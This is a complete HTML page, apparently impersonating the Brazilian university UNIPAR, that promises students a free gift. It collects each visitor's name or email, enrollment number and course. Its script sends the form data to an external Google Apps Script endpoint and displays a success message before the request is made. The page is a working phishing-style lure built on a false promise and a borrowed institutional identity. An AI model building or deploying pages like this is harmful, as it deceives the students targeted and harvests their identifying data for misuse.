<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Formulário UNIPAR</title>
    <style>
        body {
        
            font-family: Arial, sans-serif;
            background-color: #ffffff;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
        }

        .container {
            text-align: center;
        }

        .logo {
            margin-bottom: 20px;
        }

        .logo img {
            width: 150px;
        }

        .form-container {
            background-color: #fff;
            padding: 40px;
            border-radius: 10px;
            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
            width: 350px;
            margin: 20px auto;
        }

        h1 {
            color: #333;
            font-size: 24px;
            margin-bottom: 10px;
        }

        p {
            color: #666;
            margin-bottom: 30px;
        }

        .form-field {
            margin-bottom: 20px;
            text-align: left;
        }

        .form-field input {
            width: 100%;
            padding: 12px 10px;
            border: none;
            border-bottom: 2px solid #ccc;
            font-size: 16px;
            box-sizing: border-box;
            outline: none;
            transition: border-bottom-color 0.3s;
        }

        .form-field input:focus {
            border-bottom-color: #a00;
        }

        .btn-confirmar {
            width: 100%;
            padding: 15px;
            background-color: #a00;
            color: #fff;
            border: none;
            border-radius: 5px;
            font-size: 18px;
            cursor: pointer;
            transition: background-color 0.3s;
        }

        .btn-confirmar:hover {
            background-color: #800;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <img src="image.png" alt="Logo UNIPAR">
        </div>
        <h1>A Unipar está dando um brinde aos alunos!</h1>
        <p>Só informar seus dados e depois ir até a sala da coordenação</p>

        <div class="form-container">
            <form id="uniparForm">
                <div class="form-field">
                    <input type="text" id="nomeEmail" name="Nome ou E-mail" placeholder="Nome ou E-mail" required>
                </div>
                <div class="form-field">
                    <input type="text" id="matricula" name="Matrícula" placeholder="Matrícula" required>
                </div>
                <div class="form-field">
                    <input type="text" id="curso" name="Curso" placeholder="Curso" required>
                </div>
                
                <button type="submit" class="btn-confirmar">Confirmar Dados</button>
            </form>
        </div>
    </div>

    <script>
function mostrarAviso(mensagem, tipo = 'sucesso') {
    const avisoAnterior = document.getElementById('avisoPersonalizado');
    if (avisoAnterior) {
        avisoAnterior.remove();
    }
    
    const cores = {
        sucesso: { bg: '#d4edda', border: '#28a745', texto: '#155724' },
        erro: { bg: '#f8d7da', border: '#dc3545', texto: '#721c24' }
    };
    
    const cor = cores[tipo];
    
    const aviso = document.createElement('div');
    aviso.id = 'avisoPersonalizado';
    aviso.innerHTML = `
        <div style="
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background: ${cor.bg};
            border: 3px solid ${cor.border};
            padding: 30px;
            font-size: 22px;
            font-weight: bold;
            color: ${cor.texto};
            box-shadow: 0 6px 12px rgba(0,0,0,0.3);
            z-index: 9999;
            border-radius: 12px;
            text-align: center;
            max-width: 500px;
            line-height: 1.4;
        ">
            ${mensagem}
            <br><br>
            <button onclick="document.getElementById('avisoPersonalizado').remove()" 
                    style="
                        font-size: 18px; 
                        padding: 12px 24px;
                        background: ${cor.border};
                        color: white;
                        border: none;
                        border-radius: 6px;
                        cursor: pointer;
                        font-weight: bold;
                    ">
                OK
            </button>
        </div>
    `;
    
    const fundo = document.createElement('div');
    fundo.style.cssText = `
        position: fixed;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        background: rgba(0,0,0,0.5);
        z-index: 9998;
    `;
    aviso.appendChild(fundo);
    
    document.body.appendChild(aviso);
    
    fundo.addEventListener('click', () => {
        aviso.remove();
    });
}

const form = document.getElementById('uniparForm');
const scriptURL = 'https://script.google.com/macros/s/AKfycbymMX8fmeom-XdsgyMVYUzix3kmih4fym17fOyyy_XJnQEVEUqNDMzGp5FVnZVn467h/exec';

form.addEventListener('submit', function(e) {
    e.preventDefault(); 
    
    const formData = new FormData(this);

    mostrarAviso('Dados enviados com sucesso!<br>Agora é só ir na sala da coordenação.', 'sucesso');
            form.reset(); 
            
    fetch(scriptURL, {
        method: 'POST',
        body: formData
    })
    .then(response => {
        
            
        
    })
    .catch(error => {
        console.error('Erro:', error);
        mostrarAviso('Ocorreu um erro ao enviar os dados.<br>Por favor, tente novamente.', 'erro');
    });
});
</script>
</body>
</html>
